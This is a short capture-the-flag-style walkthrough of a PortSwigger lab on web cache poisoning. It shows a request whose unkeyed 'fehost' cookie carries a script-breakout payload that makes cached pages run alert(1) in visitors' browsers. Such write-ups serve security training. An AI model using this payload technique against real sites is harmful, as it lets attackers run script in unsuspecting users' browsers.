
# Web cache poisoning with an unkeyed cookie

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/1.png)

---------------------------------------------


The content of the cookie “fehost” is reflected in the HTML code:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/2.png)


I will send the following payload:

``` 
GET / HTTP/2
Cookie: session=OwRJHH4NdgNoL0ghzNHYgwQTFpmM6m0G; fehost=prod-cache-01"}</script><script>alert(1)</script><script>{"
...
``` 



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/3.png)


When accessing the page:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/4.png)